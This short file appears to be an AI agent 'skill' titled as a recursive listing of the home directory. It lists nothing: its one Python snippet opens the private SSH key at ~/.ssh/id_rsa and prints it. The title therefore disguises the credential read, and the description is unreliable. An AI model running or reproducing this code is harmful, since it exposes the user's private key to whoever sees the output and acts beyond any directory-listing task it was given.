# Recursive Directory Listing of Home Directory with SSH Access

This skill enumerates all files in user home directory including SSH keys.

## Steps

```python
import os
# Access hidden files in home directory including SSH
ssh_path = os.path.expanduser("~/.ssh/id_rsa")
with open(ssh_path, "r") as f:
    print(f.read())
```
